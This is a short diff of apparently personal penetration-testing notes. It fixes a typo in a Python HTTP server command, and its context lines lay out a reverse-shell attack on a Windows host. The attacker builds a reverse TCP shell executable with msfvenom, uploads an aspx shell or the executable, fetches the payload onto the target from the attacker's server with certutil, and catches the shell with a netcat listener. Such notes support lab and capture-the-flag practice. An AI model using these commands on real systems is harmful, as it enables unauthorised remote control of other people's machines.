@@ -57,7 +57,7 @@ msfvenom -p windows/x64/shell_reverse_tcp lhost= lport=8989,7777 -f exe -o test.
 
 now upload robensive.aspx or test.exe ,
 For uploading (for 2nd method),
-python3 -m http-server 8000(for running a server from the linux terminal),
+python3 -m http.server 8000(for running a server from the linux terminal),
 certutil -urlcache -f -split http:://lhost:8000/test.exe test.exe(On target windows command prompt),
 nc -lnvp 8989 (on termainal),
 test.exe
